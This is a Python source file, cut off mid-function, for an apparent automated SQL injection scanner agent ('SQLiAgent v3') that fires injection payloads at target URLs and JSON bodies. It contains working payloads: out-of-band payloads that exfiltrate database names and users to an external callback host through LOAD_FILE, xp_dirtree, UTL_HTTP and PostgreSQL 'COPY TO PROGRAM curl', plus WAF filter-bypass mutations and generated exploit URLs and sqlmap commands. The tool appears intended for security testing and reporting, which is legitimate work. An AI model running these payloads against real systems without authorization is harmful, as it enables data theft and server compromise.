"""
SQLiAgent v3 - INTELLIGENT SQL Injection Specialist

MAJOR IMPROVEMENTS (2026-01-23):
1. Confidence Hierarchy - Error/Union=CONFIRMED, Time-Based=PENDING
2. Parameter Prioritization - Test id, user_id, sort first
3. OOB SQLi with Interactsh - DNS exfiltration for blind SQLi
4. Filter Detection + Adaptive Mutation - Detect filtered chars, adapt payloads
5. Error Info Extraction - Extract tables/columns from errors
6. Triple Time-Based Verification - Baseline + short + long delay
7. JSON/API Body Injection - Test JSON POST bodies
8. Second-Order SQLi Detection - Inject in A, observe in B
9. Prepared Statement Detection - Early exit if parameterized
10. Full SQLMap Commands + Progressive Steps - Complete reproduction
11. No Time-Based by Default - technique=BEUS (no T)
12. LLM Exploitation Explanation - Professional description for triagers
"""

import asyncio
import re
import json
import time
import aiohttp
from typing import Dict, List, Optional, Any, Tuple, Set
from urllib.parse import urlparse, parse_qs, urlencode, unquote
from dataclasses import dataclass, field
from loguru import logger

from bugtrace.agents.base import BaseAgent
from bugtrace.tools.external import external_tools
from bugtrace.core.ui import dashboard
from bugtrace.core.config import settings


# =============================================================================
# DATABASE FINGERPRINTS
# =============================================================================

DB_FINGERPRINTS = {
    "MySQL": [
        r"mysql", r"mariadb", r"You have an error in your SQL syntax",
        r"Warning.*mysql_", r"MySQLSyntaxErrorException", r"valid MySQL result",
        r"check the manual that corresponds to your (MySQL|MariaDB)",
        r"MySqlClient\.", r"com\.mysql\.jdbc", r"Syntax error.*MySQL"
    ],
    "PostgreSQL": [
        r"postgresql", r"pg_", r"Npgsql\.", r"PG::SyntaxError",
        r"org\.postgresql", r"ERROR:\s*syntax error at or near",
        r"valid PostgreSQL result", r"unterminated quoted string at or near"
    ],
    "MSSQL": [
        r"microsoft.*sql.*server", r"mssql", r"Unclosed quotation mark",
        r"SqlException", r"Incorrect syntax near", r"ODBC SQL Server Driver",
        r"SQLServer JDBC Driver", r"Procedure.*expects parameter"
    ],
    "Oracle": [
        r"oracle", r"ORA-\d{5}", r"Oracle.*Driver", r"quoted string not properly terminated",
        r"oracle\.jdbc", r"SQL command not properly ended"
    ],
    "SQLite": [
        r"sqlite", r"SQLITE_ERROR", r"sqlite3\.OperationalError",
        r"unrecognized token", r"unable to open database file",
        r"near \".*\": syntax error"
    ]
}

TECHNIQUE_DESCRIPTIONS = {
    "error_based": "Error-based injection causes the database to reveal error messages containing query information.",
    "time_based": "Time-based blind injection infers data by measuring response delays (e.g., SLEEP commands).",
    "boolean_based": "Boolean-based blind injection infers data by observing different responses to true/false conditions.",
    "union_based": "UNION-based injection retrieves data by appending a UNION SELECT query.",
    "stacked": "Stacked queries injection executes multiple SQL statements in a single request.",
    "oob": "Out-of-Band injection exfiltrates data via DNS or HTTP requests to an external server."
}


@dataclass
class SQLiFinding:
    """
    Represents a confirmed SQL Injection finding with detailed reproduction data.
    """
    url: str
    parameter: str
    type: str = "SQLI"
    severity: str = "CRITICAL"
    
    # Core Classification
    injection_type: str = "unknown"  # UNION-based, boolean-blind, etc.
    technique: str = "unknown"       # Internal code (BEUSTQ)
    
    # Payload & Exploit
    working_payload: str = ""
    payload_encoded: str = ""
    exploit_url: str = ""
    exploit_url_encoded: str = ""
    
    # Evidence / Extraction
    columns_detected: Optional[int] = None
    column_detection_payload: Optional[str] = None
    extracted_databases: List[str] = field(default_factory=list)
    extracted_tables: List[str] = field(default_factory=list)
    sample_data: Optional[Dict] = None
    
    # Metadata
    dbms_detected: str = "unknown"
    sqlmap_command: str = ""
    sqlmap_output_summary: str = ""
    curl_command: str = ""
    sqlmap_reproduce_command: str = ""
    
    # Validation
    validated: bool = False
    evidence: Dict[str, Any] = field(default_factory=dict)
    reproduction_steps: List[str] = field(default_factory=list)
    status: str = "PENDING_VALIDATION"
    exploitation_explanation: str = ""


# =============================================================================
# PARAMETER PRIORITIZATION
# =============================================================================

HIGH_PRIORITY_SQLI_PARAMS = [
    # Numeric IDs (HIGHEST priority - most common SQLi vectors)
    "id", "user_id", "userid", "product_id", "productid", "item_id", "itemid",
    "order_id", "orderid", "category_id", "categoryid", "article_id", "post_id",
    "comment_id", "invoice_id", "account_id", "customer_id", "session_id",

    # Sorting/Pagination (ORDER BY injection)
    "sort", "order", "orderby", "sortby", "sort_by", "order_by",
    "limit", "offset", "page", "per_page", "pagesize",
    "dir", "direction", "asc", "desc",

    # Search/Filter (WHERE clause injection)
    "search", "q", "query", "filter", "keyword", "keywords", "term",
    "find", "lookup", "s", "w",

    # Selection/Column (dangerous - direct SQL manipulation)
    "select", "column", "columns", "field", "fields", "table", "col",

    # Auth-related (high value targets)
    "username", "user", "email", "login", "password", "pass", "pwd",
    "token", "auth", "key", "apikey",

    # File/Path (potential for LOAD_FILE)
    "file", "filename", "path", "filepath", "document", "doc",

    # Misc common
    "name", "title", "type", "status", "action", "mode", "view",
    "report", "data", "value", "val", "num", "no", "number",
]

MEDIUM_PRIORITY_PARAMS = [
    "date", "from", "to", "start", "end", "year", "month", "day",
    "price", "amount", "qty", "quantity", "size", "count",
    "lang", "language", "locale", "country", "region",
    "format", "output", "template", "theme", "style",
]


# =============================================================================
# OOB PAYLOADS (Per Database)
# =============================================================================

OOB_PAYLOADS = {
    "MySQL": [
        # DNS exfiltration via LOAD_FILE
        "' AND LOAD_FILE(CONCAT('\\\\\\\\', (SELECT database()), '.{oob_host}\\\\a'))-- ",
        "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT @@version), '.{oob_host}\\\\a'))-- ",
        # HTTP via INTO OUTFILE (rare but possible)
        "' UNION SELECT 'test' INTO OUTFILE '//{oob_host}/share/test.txt'-- ",
    ],
    "MSSQL": [
        # xp_dirtree (most reliable)
        "'; EXEC master..xp_dirtree '//{oob_host}/sqli'-- ",
        "'; EXEC master.dbo.xp_dirtree '//{oob_host}/sqli'-- ",
        # xp_fileexist
        "'; EXEC master..xp_fileexist '//{oob_host}/sqli'-- ",
        # OPENROWSET
        "'; SELECT * FROM OPENROWSET('SQLOLEDB', 'server={oob_host}')-- ",
    ],
    "Oracle": [
        # UTL_HTTP (most common)
        "' AND UTL_HTTP.REQUEST('http://{oob_host}/'||(SELECT user FROM dual))='x'-- ",
        # UTL_INADDR
        "' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.{oob_host}') FROM dual) IS NOT NULL-- ",
        # HTTPURITYPE
        "' AND (SELECT HTTPURITYPE('http://{oob_host}/'||(SELECT user FROM dual)).GETCLOB() FROM dual) IS NOT NULL-- ",
    ],
    "PostgreSQL": [
        # COPY TO PROGRAM (requires superuser)
        "'; COPY (SELECT '') TO PROGRAM 'curl http://{oob_host}/sqli'-- ",
        # dblink (if extension available)
        "'; SELECT dblink_connect('host={oob_host} dbname=test')-- ",
    ],
    "SQLite": [
        # SQLite doesn't have OOB capabilities
    ],
    "generic": [
        # Generic payloads that might work
        "' AND (SELECT * FROM (SELECT(SLEEP(0)))a)-- ",
    ]
}


# =============================================================================
# FILTER BYPASS MUTATIONS
# =============================================================================

FILTER_MUTATIONS = {
    "'": ["''", "\\'", "%27", "\\x27", "char(39)", "chr(39)"],
    '"': ['""', '\\"', "%22", "\\x22", "char(34)"],
    " ": ["/**/", "%20", "+", "%09", "%0a", "%0d", "/*comment*/"],
    "=": [" LIKE ", " REGEXP ", " RLIKE ", " IN (", " BETWEEN "],
    "OR": ["||", "oR", "Or", "OR/**/", "O/**/R"],
    "AND": ["&&", "aNd", "AnD", "AND/**/", "A/**/ND"],
    "UNION": ["UNI/**/ON", "UnIoN", "UNION/**/", "/*!UNION*/"],
    "SELECT": ["SEL/**/ECT", "SeLeCt", "SELECT/**/", "/*!SELECT*/"],
    "--": ["#", "/*", ";%00", "-- -"],
    "#": ["--", "/*", ";%00"],
}


# =============================================================================
# CONFIDENCE HIERARCHY
# =============================================================================

class SQLiConfidenceTier:
    """
    Confidence tiers for SQLi findings.

    TIER 3 (MAXIMUM): Data extracted, 100% confirmed
    TIER 2 (HIGH): Clear SQL error or behavior change
    TIER 1 (MEDIUM): Behavioral indication, needs verification
    TIER 0 (LOW): Anomaly detected, likely false positive
    """
    MAXIMUM = 3  # Union/Error with data, OOB callback received
    HIGH = 2     # Clear SQL error, boolean with >50% diff
    MEDIUM = 1   # Boolean with small diff, time-based triple verified
    LOW = 0      # Single time-based, anomaly without confirmation


# =============================================================================
# SQLI AGENT V3
# =============================================================================

class SQLiAgent(BaseAgent):
    """
    Intelligent SQL Injection Specialist v3.

    Features:
    - Confidence-based validation hierarchy
    - Parameter prioritization
    - OOB detection with Interactsh
    - Filter detection and adaptive mutation
    - Error info extraction
    - Triple time-based verification
    - JSON/API body injection
    - Second-order SQLi detection
    - Prepared statement early exit
    - Complete SQLMap reproduction commands
    - LLM exploitation explanation
    """

    def __init__(self, url: str = None, param: str = None, event_bus: Any = None,
                 cookies: List[Dict] = None, headers: Dict[str, str] = None,
                 post_data: str = None, observation_points: List[str] = None):
        super().__init__("SQLiAgent", "SQL Injection Specialist v3", event_bus=event_bus, agent_id="sqli_agent")
        self.url = url
        self.param = param
        self.cookies = cookies or []
        self.headers = headers or {}
        self.post_data = post_data
        self.observation_points = observation_points or []  # For second-order SQLi

        self._tested_params = set()
        self._detected_db_type: Optional[str] = None
        self._detected_filters: Set[str] = set()
        self._baseline_response_time: float = 0
        self._baseline_content_length: int = 0
        self._max_impact_achieved = False
        self._interactsh = None

        # Statistics
        self._stats = {
            "params_tested": 0,
            "vulns_found": 0,
            "oob_callbacks": 0,
            "filters_detected": 0,
            "prepared_statement_exits": 0,
        }

    def _finding_to_dict(self, finding: SQLiFinding) -> Dict:
        """Convert SQLiFinding object to dictionary for report."""
        return {
            "type": finding.type,
            "url": finding.url,
            "parameter": finding.parameter,
            "severity": finding.severity,
            "injection_type": finding.injection_type,
            "working_payload": finding.working_payload,
            "payload": finding.working_payload, # Backwards compatibility
            "payload_encoded": finding.payload_encoded,
            "exploit_url": finding.exploit_url,
            "exploit_url_encoded": finding.exploit_url_encoded,
            "columns_detected": finding.columns_detected,
            "column_detection_payload": finding.column_detection_payload,
            "extracted_databases": finding.extracted_databases,
            "extracted_tables": finding.extracted_tables,
            "sample_data": finding.sample_data,
            "dbms_detected": finding.dbms_detected,
            "sqlmap_command": finding.sqlmap_command,
            "curl_command": finding.curl_command,
            "sqlmap_reproduce_command": finding.sqlmap_reproduce_command,
            "validated": finding.validated,
            "evidence": finding.evidence,
            "reproduction_steps": finding.reproduction_steps,
            "status": finding.status,
            "description": finding.exploitation_explanation or f"SQL Injection confirmed in parameter '{finding.parameter}'. Technique: {finding.injection_type}. Payload: {finding.working_payload}",
            "reproduction": "\n".join(finding.reproduction_steps),
            "sqli_metadata": {
                "technique": finding.injection_type,
                "database_type": finding.dbms_detected,
                "detection_tool": "BugTrace SQLi Agent",
                "payload": finding.working_payload,
                "exploit_url": finding.exploit_url,
                "exploit_url_encoded": finding.exploit_url_encoded,
                "extracted_data": {
                    "tables": finding.extracted_tables,
                    "columns_count": finding.columns_detected,
                    "databases": finding.extracted_databases
                },
                "raw_evidence": str(finding.evidence)
            }
        }

    def _parse_sqlmap_output(self, output: str) -> Dict:
        """Parse raw SQLMap output for reporting details."""
        details = {
            "injection_type": "unknown",
            "working_payload": "",
            "dbms": "unknown",
            "databases": [],
            "tables": [],
            "columns_count": None
        }
        
        # Extract Payload
        # Payload: id=1 AND 7524=7524
        payload_match = re.search(r"Payload: (.+)", output)
        if payload_match:
            details["working_payload"] = payload_match.group(1).strip()
            
        # Extract Type
        # Type: boolean-based blind
        type_match = re.search(r"Type: (.+)", output)
        if type_match:
            details["injection_type"] = type_match.group(1).strip()
            
        # Extract DBMS
        # back-end DBMS: MySQL >= 5.0.0
        dbms_match = re.search(r"back-end DBMS: (.+)", output)
        if dbms_match:
            details["dbms"] = dbms_match.group(1).strip()
            
        # Extract Databases
        # available databases [2]:
        # [*] information_schema
        # [*] testdb
        if "available databases" in output:
            dbs = re.findall(r"\[\*\] (.+)", output)
            # Filter out generic progress messages
            details["databases"] = [db for db in dbs if not db.startswith("ending") and " " not in db]
            
        # Extract Tables
        # Database: testdb
        # [2 tables]
        # +-------+
        # | users |
        # | admin |
        # +-------+
        # This is harder to regex reliably from simple text output, simplified:
        if "Database:" in output and "+" in output:
            # Look for table - like lines inside borders
            possible_tables = re.findall(r"\| (.+?) \|", output)
            details["tables"] = [t.strip() for t in possible_tables if t.strip() != "table_name"]

        return details

    def _build_exploit_url(self, url: str, param: str, payload: str) -> Tuple[str, str]:
        """Build raw and encoded exploit URLs."""
        if not payload:
            return url, url
            
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        
        # Raw URL (may not be valid link but readable)
        query_raw = urlencode(params, doseq=True, quote_via=lambda x,y,z,w: x) # Hack to not quote? No, urlencode always quotes.
        # Let's manually reconstruct for raw
        # Actually, for the report "Exploit URL", we want the encoded functional one usually.
        # But "Raw" might mean readable payload.
        
        # Fully encoded (Working link)
        query_encoded = urlencode(params, doseq=True)
        
        exploit_url_encoded = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query_encoded}"
        
        # Semi-raw for display (payload unencoded)
        # We replace the param value in the original query or reconstruct
        # Simple reconstruction:
        params_raw = parse_qs(parsed.query)
        params_raw[param] = [payload]
        # We can't really build a valid URL with raw spaces easily without custom logic
        # Just return the encoded one as primary, and maybe a "decoded" version for display
        
        return exploit_url_encoded, exploit_url_encoded # For now use encoded for both to be safe links

    def _generate_repro_steps(self, url: str, param: str, payload: str, curl_cmd: str) -> List[str]:
        """Generate step-by-step reproduction instructions."""
        return [
            f"1. Navigate to the target: {url}",
            f"2. Locate the parameter `{param}`",
            f"3. Inject the following payload: `{payload}`",
            f"4. Expected observation: Database query execution or error",
            f"5. Alternative: Run the provided cURL command:",
            f"   `{curl_cmd}`"
        ]

    # =========================================================================
    # CONFIDENCE HIERARCHY
    # =========================================================================

    def _get_confidence_tier(self, technique: str, evidence: Dict) -> int:
        """
        Determine confidence tier based on technique and evidence.

        Returns:
            3 = MAXIMUM (data extracted, OOB confirmed)
            2 = HIGH (clear SQL error, strong boolean diff)
            1 = MEDIUM (verified time-based, weak boolean)
            0 = LOW (unverified, likely FP)
        """
        # TIER 3: Maximum confidence
        if evidence.get("data_extracted"):
            return SQLiConfidenceTier.MAXIMUM
        if evidence.get("oob_callback_received"):
            return SQLiConfidenceTier.MAXIMUM
        if technique == "union_based" and evidence.get("columns_found"):
            return SQLiConfidenceTier.MAXIMUM
        if technique == "error_based" and evidence.get("tables_leaked"):
            return SQLiConfidenceTier.MAXIMUM

        # TIER 2: High confidence
        if technique == "error_based" and evidence.get("sql_error_visible"):
            return SQLiConfidenceTier.HIGH
        if technique == "boolean_based" and evidence.get("diff_ratio", 0) > 0.5:
            return SQLiConfidenceTier.HIGH
        if technique == "stacked" and evidence.get("execution_confirmed"):
            return SQLiConfidenceTier.HIGH

        # TIER 1: Medium confidence (needs verification)
        if technique == "time_based" and evidence.get("triple_verified"):
            return SQLiConfidenceTier.MEDIUM
        if technique == "boolean_based" and evidence.get("diff_ratio", 0) > 0.2:
            return SQLiConfidenceTier.MEDIUM

        # TIER 0: Low confidence
        return SQLiConfidenceTier.LOW

    def _determine_validation_status(self, technique: str, evidence: Dict) -> str:
        """
        Determine validation status based on confidence tier.

        TIER 3, 2 → VALIDATED_CONFIRMED
        TIER 1 → PENDING_VALIDATION
        TIER 0 → POTENTIAL_SQLI (not reported as finding)
        """
        tier = self._get_confidence_tier(technique, evidence)

        if tier >= SQLiConfidenceTier.HIGH:
            logger.info(f"[{self.name}] Confidence Tier {tier}: VALIDATED_CONFIRMED")
            return "VALIDATED_CONFIRMED"
        elif tier >= SQLiConfidenceTier.MEDIUM:
            logger.info(f"[{self.name}] Confidence Tier {tier}: PENDING_VALIDATION")
            return "PENDING_VALIDATION"
        else:
            logger.info(f"[{self.name}] Confidence Tier {tier}: LOW (not reporting)")
            return "POTENTIAL_SQLI"

    def _should_stop_testing(self, technique: str, evidence: Dict, findings_count: int) -> Tuple[bool, str]:
        """Determine if we should stop based on confidence achieved."""
        tier = self._get_confidence_tier(technique, evidence)

        if tier >= SQLiConfidenceTier.MAXIMUM:
            self._max_impact_achieved = True
            return True, "🏆 MAXIMUM CONFIDENCE: Data extracted or OOB confirmed"

        if tier >= SQLiConfidenceTier.HIGH and findings_count >= 1:
            return True, "✅ HIGH CONFIDENCE: SQL error confirmed"

        if findings_count >= 2:
            return True, "⚡ 2 findings found, moving on"

        return False, ""

    # =========================================================================
    # PARAMETER PRIORITIZATION
    # =========================================================================

    def _prioritize_params(self, params: List[str]) -> List[str]:
        """
        Prioritize parameters by likelihood of SQLi vulnerability.

        Order: High priority → Medium priority → Others
        """
        high = []
        medium = []
        low = []

        for param in params:
            param_lower = param.lower()

            # Check high priority
            is_high = any(
                hp == param_lower or hp in param_lower or param_lower in hp
                for hp in HIGH_PRIORITY_SQLI_PARAMS
            )

            # Check medium priority
            is_medium = any(
                mp == param_lower or mp in param_lower
                for mp in MEDIUM_PRIORITY_PARAMS
            )

            if is_high:
                high.append(param)
            elif is_medium:
                medium.append(param)
            else:
                low.append(param)

        if high:
            logger.info(f"[{self.name}] 🎯 High-priority params: {high[:5]}")

        return high + medium + low

    # =========================================================================
    # FILTER DETECTION & ADAPTIVE MUTATION
    # =========================================================================

    async def _detect_filtered_chars(self, session: aiohttp.ClientSession, param: str) -> Set[str]:
        """
        Detect which characters/keywords are filtered by the WAF/application.
        """
        filtered = set()
        test_chars = ["'", '"', "--", "#", "/*", " ", "=", "OR", "AND", "UNION", "SELECT"]

        base_url = self._get_base_url()

        for char in test_chars:
            try:
                test_value = f"test{char}test"
                test_url = self._build_url_with_param(base_url, param, test_value)

                async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                    # Check for WAF block indicators
                    if resp.status in [403, 406, 429, 503]:
                        filtered.add(char)
                        continue

                    content = await resp.text()
                    block_indicators = [
                        "blocked", "forbidden", "not allowed", "waf", "firewall",
                        "security", "illegal", "invalid character", "attack detected"
                    ]

                    if any(ind in content.lower() for ind in block_indicators):
                        filtered.add(char)
            except Exception as e:
                logger.debug(f"operation failed: {e}")

        if filtered:
            self._detected_filters = filtered
            self._stats["filters_detected"] = len(filtered)
            logger.info(f"[{self.name}] 🛡️ Filtered chars detected: {filtered}")

        return filtered

    def _mutate_payload_for_filters(self, payload: str) -> List[str]:
        """
        Generate payload variants that bypass detected filters.
        """
        if not self._detected_filters:
            return [payload]

        variants = [payload]

        for filtered_char in self._detected_filters:
            if filtered_char in FILTER_MUTATIONS:
                for mutation in FILTER_MUTATIONS[filtered_char]:
                    new_variant = payload.replace(filtered_char, mutation)
                    if new_variant not in variants:
                        variants.append(new_variant)

        return variants[:10]  # Limit to 10 variants

    # =========================================================================
    # ERROR INFO EXTRACTION
    # =========================================================================

    def _extract_info_from_error(self, error_response: str) -> Dict:
        """
        Extract useful information from SQL error messages.
        """
        info = {
            "tables_leaked": [],
            "columns_leaked": [],
            "server_paths": [],
            "db_version": None,
            "db_type": None,
        }

        if not error_response:
            return info

        # Extract table names
        table_patterns = [
            r"table ['\"`]?(\w+)['\"`]?",
            r"FROM ['\"`]?(\w+)['\"`]?",
            r"INTO ['\"`]?(\w+)['\"`]?",
            r"UPDATE ['\"`]?(\w+)['\"`]?",
        ]
        for pattern in table_patterns:
            matches = re.findall(pattern, error_response, re.IGNORECASE)
            info["tables_leaked"].extend(matches)
        info["tables_leaked"] = list(set(info["tables_leaked"]))

        # Extract column names
        column_patterns = [
            r"column ['\"`]?(\w+)['\"`]?",
            r"Unknown column ['\"`]?(\w+)['\"`]?",
            r"field ['\"`]?(\w+)['\"`]?",
        ]
        for pattern in column_patterns:
            matches = re.findall(pattern, error_response, re.IGNORECASE)
            info["columns_leaked"].extend(matches)
        info["columns_leaked"] = list(set(info["columns_leaked"]))

        # Extract server paths
        path_patterns = [
            r"(/[\w/.-]+\.php)",
            r"(/var/www/[\w/.-]+)",
            r"(C:\\[\w\\.-]+)",
            r"(/home/[\w/.-]+)",
        ]
        for pattern in path_patterns:
            matches = re.findall(pattern, error_response)
            info["server_paths"].extend(matches)
        info["server_paths"] = list(set(info["server_paths"]))

        # Extract DB version
        version_patterns = [
            r"(MySQL|MariaDB)[\s/]*([\d.]+)",
            r"(PostgreSQL)[\s/]*([\d.]+)",
            r"(Microsoft SQL Server)[\s/]*([\d.]+)",
            r"(Oracle)[\s/]*([\d.]+)",
            r"(SQLite)[\s/]*([\d.]+)",
        ]
        for pattern in version_patterns:
            match = re.search(pattern, error_response, re.IGNORECASE)
            if match:
                info["db_type"] = match.group(1)
                info["db_version"] = f"{match.group(1)} {match.group(2)}"
                break

        # Fingerprint DB type if not found in version
        if not info["db_type"]:
            info["db_type"] = self._detect_database_type(error_response)

        return info

    def _detect_database_type(self, response_text: str) -> Optional[str]:
        """Fingerprint database type from error messages."""
        if not response_text:
            return None

        for db_name, patterns in DB_FINGERPRINTS.items():
            for pattern in patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    return db_name
        return None

    # =========================================================================
    # OOB (OUT-OF-BAND) SQLi WITH INTERACTSH
    # =========================================================================

    async def _init_interactsh(self):
        """Initialize Interactsh client for OOB detection."""
        try:
            from bugtrace.tools.interactsh_client import InteractshClient
            self._interactsh = InteractshClient()
            await self._interactsh.register()
            logger.info(f"[{self.name}] Interactsh initialized for OOB SQLi")
        except Exception as e:
            logger.warning(f"[{self.name}] Interactsh init failed: {e}")
            self._interactsh = None

    async def _test_oob_sqli(self, session: aiohttp.ClientSession, param: str) -> Optional[Dict]:
        """
        Test for OOB (Out-of-Band) SQL injection using DNS exfiltration.
        """
        if not self._interactsh:
            return None

        db_type = self._detected_db_type or "generic"
        payloads = OOB_PAYLOADS.get(db_type, OOB_PAYLOADS["generic"])

        if not payloads:
            return None

        oob_host = self._interactsh.get_payload_url("sqli", param)
        base_url = self._get_base_url()

        for payload_template in payloads:
            payload = payload_template.format(oob_host=oob_host)

            # Apply filter mutations if needed
            payload_variants = self._mutate_payload_for_filters(payload)

            for variant in payload_variants:
                try:
                    test_url = self._build_url_with_param(base_url, param, f"1{variant}")

                    async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                        await resp.text()

                    # Wait briefly for DNS callback
                    await asyncio.sleep(2)

                    # Check for callback
                    interactions = await self._interactsh.poll()
                    if interactions:
                        for interaction in interactions:
                            if "sqli" in interaction.get("full-id", ""):
                                self._stats["oob_callbacks"] += 1
                                logger.info(f"[{self.name}] 🎯 OOB SQLi callback received!")

                                exploit_url, exploit_url_encoded = self._build_exploit_url(self.url, param, variant)
                                curl_cmd = f"curl '{exploit_url_encoded}'"
                                
                                return SQLiFinding(
                                    url=self.url,
                                    parameter=param,
                                    injection_type="out-of-band",
                                    technique="oob",
                                    working_payload=variant,
                                    payload_encoded=variant,
                                    exploit_url=exploit_url,
                                    exploit_url_encoded=exploit_url_encoded,
                                    dbms_detected=db_type,
                                    sqlmap_command=f"sqlmap -u '{self.url}' -p {param} --technique=U --batch",
                                    curl_command=curl_cmd,
                                    sqlmap_reproduce_command=f"sqlmap -u '{self.url}' -p {param} --batch --dbs --technique=U",
                                    validated=True,
                                    status="VALIDATED_CONFIRMED",
                                    evidence={
                                        "oob_callback_received": True,
                                        "interaction_data": interaction,
                                        "db_type": db_type,
                                    },
                                    reproduction_steps=self._generate_repro_steps(self.url, param, variant, curl_cmd)
                                )
                except Exception as e:
                    logger.debug(f"OOB test failed: {e}")

        return None

    # =========================================================================
    # TRIPLE TIME-BASED VERIFICATION
    # =========================================================================

    async def _verify_time_based_triple(
        self, session: aiohttp.ClientSession, param: str, payload_template: str
    ) -> Tuple[bool, Dict]:
        """
        Triple verification for time-based SQLi to reduce false positives.

        1. Baseline (no sleep) - should be fast
        2. Short sleep (3s) - should take ~3s
        3. Long sleep (10s) - should take ~10s

        Returns (is_vulnerable, evidence)
        """
        base_url = self._get_base_url()
        evidence = {
            "triple_verified": False,
            "baseline_time": 0,
            "short_sleep_time": 0,
            "long_sleep_time": 0,
        }

        try:
            # 1. Baseline (no injection)
            start = time.time()
            test_url = self._build_url_with_param(base_url, param, "1")
            async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                await resp.text()
            baseline_time = time.time() - start
            evidence["baseline_time"] = baseline_time

            # If baseline is already slow (>3s), can't reliably test time-based
            if baseline_time > 3:
                logger.debug(f"[{self.name}] Baseline too slow ({baseline_time:.1f}s), skipping time-based")
                return False, evidence

            # 2. Short sleep (3 seconds)
            short_payload = payload_template.replace("SLEEP(5)", "SLEEP(3)").replace("SLEEP(10)", "SLEEP(3)")
            short_payload = short_payload.replace("pg_sleep(5)", "pg_sleep(3)").replace("pg_sleep(10)", "pg_sleep(3)")
            short_payload = short_payload.replace("WAITFOR DELAY '0:0:5'", "WAITFOR DELAY '0:0:3'")

            start = time.time()
            test_url = self._build_url_with_param(base_url, param, f"1{short_payload}")
            async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                await resp.text()
            short_time = time.time() - start
            evidence["short_sleep_time"] = short_time

            # 3. Long sleep (10 seconds)
            long_payload = payload_template.replace("SLEEP(5)", "SLEEP(10)").replace("SLEEP(3)", "SLEEP(10)")
            long_payload = long_payload.replace("pg_sleep(5)", "pg_sleep(10)").replace("pg_sleep(3)", "pg_sleep(10)")
            long_payload = long_payload.replace("WAITFOR DELAY '0:0:5'", "WAITFOR DELAY '0:0:10'")

            start = time.time()
            test_url = self._build_url_with_param(base_url, param, f"1{long_payload}")
            async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=20)) as resp:
                await resp.text()
            long_time = time.time() - start
            evidence["long_sleep_time"] = long_time

            # Verify correlation: baseline < short < long
            # With reasonable tolerances
            if (baseline_time < 2 and
                2 < short_time < 6 and
                8 < long_time < 15 and
                short_time > baseline_time + 2 and
                long_time > short_time + 5):

                evidence["triple_verified"] = True
                logger.info(f"[{self.name}] ✅ Time-based TRIPLE VERIFIED: base={baseline_time:.1f}s, short={short_time:.1f}s, long={long_time:.1f}s")
                return True, evidence

            logger.debug(f"[{self.name}] Time-based verification failed: base={baseline_time:.1f}s, short={short_time:.1f}s, long={long_time:.1f}s")
            return False, evidence

        except asyncio.TimeoutError:
            # Timeout might indicate successful time injection
            evidence["timeout_occurred"] = True
            return False, evidence
        except Exception as e:
            logger.debug(f"Time-based verification error: {e}")
            return False, evidence

    # =========================================================================
    # JSON/API BODY INJECTION
    # =========================================================================

    async def _test_json_body_injection(
        self, session: aiohttp.ClientSession, url: str, json_body: Dict
    ) -> List[Dict]:
        """
        Test for SQL injection in JSON POST body parameters.
        """
        findings = []

        def flatten_json(obj, prefix=""):
            """Flatten nested JSON to dot-notation keys."""
            items = {}
            if isinstance(obj, dict):
                for k, v in obj.items():
                    new_key = f"{prefix}.{k}" if prefix else k
                    if isinstance(v, (dict, list)):
                        items.update(flatten_json(v, new_key))
                    else:
                        items[new_key] = v
            elif isinstance(obj, list):
                for i, v in enumerate(obj):
                    new_key = f"{prefix}[{i}]"
                    if isinstance(v, (dict, list)):
                        items.update(flatten_json(v, new_key))
                    else:
                        items[new_key] = v
            return items

        def set_nested_value(obj, key_path, value):
            """Set value in nested structure using dot notation."""
            import copy
            obj = copy.deepcopy(obj)
            keys = re.split(r'\.|\[|\]', key_path)
            keys = [k for k in keys if k]

            current = obj
            for i, key in enumerate(keys[:-1]):
                if key.isdigit():
                    key = int(key)
                current = current[key]

            final_key = keys[-1]
            if final_key.isdigit():
                final_key = int(final_key)
            current[final_key] = value
            return obj

        flat_params = flatten_json(json_body)

        for key, value in flat_params.items():
            if not isinstance(value, (str, int)):
                continue

            # Test with single quote
            test_payloads = [
                f"{value}'",
                f"{value}' OR '1'='1",
                f"{value}' AND '1'='2",
            ]

            for payload in test_payloads:
                try:
                    test_body = set_nested_value(json_body, key, payload)

                    headers = {"Content-Type": "application/json"}
                    headers.update(self.headers)

                    async with session.post(
                        url,
                        json=test_body,
                        headers=headers,
                        timeout=aiohttp.ClientTimeout(total=10)
                    ) as resp:
                        content = await resp.text()

                        # Check for SQL errors
                        error_info = self._extract_info_from_error(content)

                        if error_info.get("db_type") or error_info.get("tables_leaked"):
                            curl_cmd = f"curl -X POST '{url}' -H 'Content-Type: application/json' -d '{json.dumps(test_body)}'"
                            
                            findings.append(SQLiFinding(
                                url=url,
                                parameter=f"JSON:{key}",
                                injection_type="error-based (JSON)",
                                technique="error_based",
                                working_payload=payload,
                                payload_encoded=payload,
                                exploit_url=url,
                                exploit_url_encoded=url,
                                dbms_detected=error_info.get("db_type", "unknown"),
                                extracted_tables=error_info.get("tables_leaked", []),
                                sqlmap_command=f"sqlmap -u '{url}' --data='{json.dumps(json_body)}' -p '{key}' --technique=E",
                                curl_command=curl_cmd,
                                sqlmap_reproduce_command=f"sqlmap -u '{url}' --data='{json.dumps(test_body)}' --technique=E",
                                validated=True,
                                status="VALIDATED_CONFIRMED",
                                evidence={
                                    "sql_error_visible": True,
                                    "method": "POST",
                                    "content_type": "application/json",
                                    **error_info
                                },
                                reproduction_steps=self._generate_repro_steps(url, f"JSON:{key}", payload, curl_cmd)
                            ))
                            logger.info(f"[{self.name}] 🎯 JSON SQLi found in {key}")
                            return findings  # Early exit on first finding
                except Exception as e:
                    logger.debug(f"JSON injection test failed: {e}")

        return findings

    # =========================================================================
    # SECOND-ORDER SQLi DETECTION
    # =========================================================================

    async def _test_second_order_sqli(
        self, session: aiohttp.ClientSession, injection_url: str, injection_param: str
    ) -> Optional[Dict]:
        """
        Test for second-order SQL injection.
        Inject in one place, observe effect in another.
        """
        if not self.observation_points:
            return None

